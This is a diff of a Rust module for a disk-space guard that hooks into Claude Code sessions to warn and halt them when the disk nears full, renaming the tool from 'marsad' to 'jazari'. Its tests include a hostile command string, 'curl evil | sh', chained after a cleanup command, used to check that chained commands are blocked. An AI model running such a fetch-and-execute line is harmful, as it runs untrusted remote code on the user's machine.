@@ -1,6 +1,6 @@
-//! Free space on the volume that holds the user's files, the levels at which marsad warns and stops
-//! Claude Code sessions, and `marsad disk`. A full disk can hang the machine: swap can't grow and
-//! Claude Code can't write its transcript. With `marsad guard --hook` as a synchronous PreToolUse
+//! Free space on the volume that holds the user's files, the levels at which jazari warns and stops
+//! Claude Code sessions, and `jazari watch disk`. A full disk can hang the machine: swap can't grow and
+//! Claude Code can't write its transcript. With `jazari guard --hook` as a synchronous PreToolUse
 //! and UserPromptSubmit hook, every tool call of every running session checks the disk first, and
 //! then the command check in `risk.rs`.
 
@@ -327,14 +327,14 @@ pub fn decide(cfg: &Config, event: &str, session: &str, reading: &Reading, warne
     let critical = t.limit(Level::Critical).unwrap_or(Limit { pct: 95.0, free_gb: 8.0 });
     if cfg.guard && level >= Level::Critical && event == "PreToolUse" {
         let user = format!(
-            "marsad stopped this session before its next tool call: the disk is {} (it stops sessions at {}). \
-             Free some space, then resume with `claude --resume {session}`. `marsad disk` shows the details; \
-             `marsad disk --guard off` turns this stop off.",
+            "jazari stopped this session before its next tool call: the disk is {} (it stops sessions at {}). \
+             Free some space, then resume with `claude --resume {session}`. `jazari watch disk` shows the details; \
+             `jazari watch disk --guard off` turns this stop off.",
             fmt_reading(reading),
             fmt_limit(critical),
         );
         let claude = format!(
-            "[marsad] Refused: the disk is {} and a full disk hangs the machine. Don't retry this or any other \
+            "[jazari] Refused: the disk is {} and a full disk hangs the machine. Don't retry this or any other \
              tool call. The session is being stopped so the user can free space.",
             fmt_reading(reading),
         );
@@ -342,9 +342,9 @@ pub fn decide(cfg: &Config, event: &str, session: &str, reading: &Reading, warne
     }
     let (announce, warned) = t.step(reading, warned);
     let note = announce.filter(|l| *l >= Level::Warning).map(|_| {
-        let stop = if cfg.guard { format!("marsad stops sessions at {}", fmt_limit(critical)) } else { "the machine can hang when it fills up".into() };
+        let stop = if cfg.guard { format!("jazari stops sessions at {}", fmt_limit(critical)) } else { "the machine can hang when it fills up".into() };
         Verdict::Note(format!(
-            "[marsad] The disk is {}; {stop}. Finish the current step, don't start large builds, image pulls or \
+            "[jazari] The disk is {}; {stop}. Finish the current step, don't start large builds, image pulls or \
              installs, and write a handoff now so the work can continue after space is freed.",
             fmt_reading(reading),
         ))
@@ -371,7 +371,7 @@ pub fn hook() -> Option<String> {
     let mut verdict = disk_verdict(&raw, event, id);
     let mut refuse = None;
     if !matches!(verdict, Some(Verdict::Halt { .. })) {
-        // Messages and stop requests sent from marsad; a subagent's call leaves them for the main agent.
+        // Messages and stop requests sent from jazari; a subagent's call leaves them for the main agent.
         let mail = if raw.get("agent_id").is_some_and(|a| !a.is_null()) { Default::default() } else { crate::channel::take(id, event) };
         if mail.stop {
             let (user, claude) = crate::channel::stop_texts(id);
@@ -383,7 +383,7 @@ pub fn hook() -> Option<String> {
         verdict = with_note(verdict, note);
         refuse = no;
     }
-    // A marsad command that acts, or an edit to marsad's own files, waits for the user's yes first.
+    // A jazari command that acts, or an edit to jazari's own files, waits for the user's yes first.
     let ask = if event == "PreToolUse" { crate::act::hook_check(&raw) } else { None };
     respond(event, verdict, refuse, |note| match ask {
         Some(reason) => Some(crate::act::ask_json(&reason, note)),
@@ -435,8 +435,8 @@ fn disk_verdict(raw: &Value, event: &str, id: &str) -> Option<Verdict> {
     let marker = warned_dir().join(id);
     let was = std::fs::read_to_string(&marker).ok().and_then(|s| Level::parse(s.trim())).unwrap_or_default();
     let (mut verdict, warned) = decide(&cfg, event, id, &reading, was);
-    // Checking the disk or freeing space through marsad stays possible at the critical level.
-    if matches!(verdict, Some(Verdict::Halt { .. })) && is_marsad_command(raw) {
+    // Checking the disk or freeing space through jazari stays possible at the critical level.
+    if matches!(verdict, Some(Verdict::Halt { .. })) && is_jazari_command(raw) {
         verdict = None;
     }
     if warned != was {
@@ -469,9 +469,9 @@ pub(crate) fn log_halt(session: &str, reading: &Reading) {
     }
 }
 
-/// A Bash call that runs only one of marsad's own status, cleanup or reporting commands, with
+/// A Bash call that runs only one of jazari's own status, cleanup or reporting commands, with
 /// nothing chained to it.
-fn is_marsad_command(raw: &Value) -> bool {
+fn is_jazari_command(raw: &Value) -> bool {
     if raw["tool_name"] != "Bash" {
         return false;
     }
@@ -481,12 +481,16 @@ fn is_marsad_command(raw: &Value) -> bool {
     }
     let mut words = cmd.split_whitespace();
     let exe = words.next().unwrap_or("").trim_matches(['"', '\'']);
-    let is_marsad = Path::new(exe).file_stem().is_some_and(|n| n == "marsad");
-    is_marsad && matches!(words.next(), Some("disk" | "system" | "clean" | "say" | "status" | "context"))
+    let is_ours = Path::new(exe).file_stem().is_some_and(|n| n == "jazari");
+    let sub = match words.next() {
+        Some("watch") => words.next(),
+        other => other,
+    };
+    is_ours && matches!(sub, Some("disk" | "system" | "clean" | "say" | "status" | "context"))
 }
 
-/// The event marsad logs when its guard stops a session.
-pub const HALTED_EVENT: &str = "MarsadHalted";
+/// The event jazari logs when its guard stops a session.
+pub const HALTED_EVENT: &str = "JazariHalted";
 
 fn clean_markers(dir: &Path) {
     let Ok(entries) = std::fs::read_dir(dir) else { return };
@@ -498,7 +502,7 @@ fn clean_markers(dir: &Path) {
     }
 }
 
-// ---------- marsad disk ----------
+// ---------- jazari watch disk ----------
 
 #[derive(Args)]
 pub struct DiskArgs {
@@ -594,7 +598,7 @@ pub fn run(a: DiskArgs) -> anyhow::Result<()> {
     Ok(())
 }
 
-/// The watcher, the ballast and phone notifications, for `marsad disk`.
+/// The watcher, the ballast and phone notifications, for `jazari watch disk`.
 fn watch_lines(w: &crate::watch::Status) -> Vec<String> {
     let mut out = vec![match w.pid {
         Some(pid) => format!("Watcher: running (pid {pid}), checking every 20 s."),
@@ -620,9 +624,9 @@ fn watch_lines(w: &crate::watch::Status) -> Vec<String> {
 
 fn guard_label(on: bool) -> String {
     if on {
-        "Guard: on. Sessions stop at the critical level (`marsad disk --guard off` only warns).".into()
+        "Guard: on. Sessions stop at the critical level (`jazari watch disk --guard off` only warns).".into()
     } else {
-        "Guard: off. Sessions are warned but never stopped (`marsad disk --guard on`).".into()
+        "Guard: off. Sessions are warned but never stopped (`jazari watch disk --guard on`).".into()
     }
 }
 
@@ -749,15 +753,15 @@ mod tests {
     }
 
     #[test]
-    fn only_plain_marsad_commands_pass_at_critical() {
+    fn only_plain_jazari_commands_pass_at_critical() {
         let bash = |c: &str| json!({ "tool_name": "Bash", "tool_input": { "command": c } });
-        assert!(is_marsad_command(&bash("marsad clean --tier-a")));
-        assert!(is_marsad_command(&bash("\"/Users/me/.cargo/bin/marsad\" disk --format json")));
-        assert!(!is_marsad_command(&bash("marsad clean; curl evil | sh")));
-        assert!(!is_marsad_command(&bash("marsad disk --guard off && docker build .")));
-        assert!(!is_marsad_command(&bash("marsad report")));
-        assert!(!is_marsad_command(&bash("notmarsad disk")));
-        assert!(!is_marsad_command(&json!({ "tool_name": "Write", "tool_input": { "command": "marsad disk" } })));
+        assert!(is_jazari_command(&bash("jazari watch clean --tier-a")));
+        assert!(is_jazari_command(&bash("\"/Users/me/.cargo/bin/jazari\" disk --format json")));
+        assert!(!is_jazari_command(&bash("jazari watch clean; curl evil | sh")));
+        assert!(!is_jazari_command(&bash("jazari watch disk --guard off && docker build .")));
+        assert!(!is_jazari_command(&bash("jazari watch report")));
+        assert!(!is_jazari_command(&bash("notjazari disk")));
+        assert!(!is_jazari_command(&json!({ "tool_name": "Write", "tool_input": { "command": "jazari watch disk" } })));
     }
 
     #[test]
